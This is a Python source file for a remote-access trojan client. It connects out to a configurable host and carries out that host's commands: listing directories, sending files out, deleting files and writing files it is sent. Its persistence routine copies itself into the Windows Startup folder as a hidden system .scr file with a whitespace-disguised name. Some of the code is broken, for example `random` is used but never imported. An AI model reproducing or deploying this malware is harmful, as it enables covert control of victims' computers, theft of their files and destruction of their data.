import os
import socket
import shutil
import sys
def add_to_startup(self):
    self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    while True:
            self.target_path = os.path.join(self.startup_path, "{}.scr".format("".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k=5))))
            if not os.path.exists(self.target_path):
                break
    self.copy_to_startup()
def copy_to_startup(self):
        path, isExecutable = self.get_self()
        source_path = os.path.abspath(path)
        if os.path.basename(os.path.dirname(source_path)).lower() == "startup" or not isExecutable:
            return

        # Copy the file to the startup folder
        shutil.copy(source_path, self.target_path)
        os.system(f'attrib +h +s "{self.target_path}"')

def c_t_s():
    s = socket.socket()
    port = 8080
    # host = input(str("Please enter the server address : "))
    host = "Your desktop name" # Set your desktop name
    try:
        s.connect((host, port))
        print("Connected to server...")
        while True:
            command = s.recv(1024).decode()
            if not command:
                break
            print("Command received")
            if command == "view_cwd":
                files = os.getcwd()
                s.send(files.encode())
                print("Command has been executed successfully...")
            elif command == "custom_dir":
                user_input = s.recv(5000).decode()
                files = os.listdir(user_input)
                s.send(str(files).encode())
                print("Command has been executed successfully...")
            elif command == "download_file":
                file_path = s.recv(5000).decode()
                with open(file_path, "rb") as file:
                    data = file.read()
                    s.send(data)
                print("File has been sent successfully...")
            elif command == "remove_file":
                file_and_dir = s.recv(6000).decode()
                os.remove(file_and_dir)
                print("Command has been executed successfully...")
            elif command == "send_file":
                filename = s.recv(6000).decode()
                with open(filename, "wb") as new_file:
                    data = s.recv(6000)
                    new_file.write(data)
                print("File received and saved successfully...")
            elif command == "startup":
                add_to_startup()
            else:
                print("Command not recognised")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        s.close()
        print("Connection closed.")

if __name__ == "__main__":
    c_t_s()
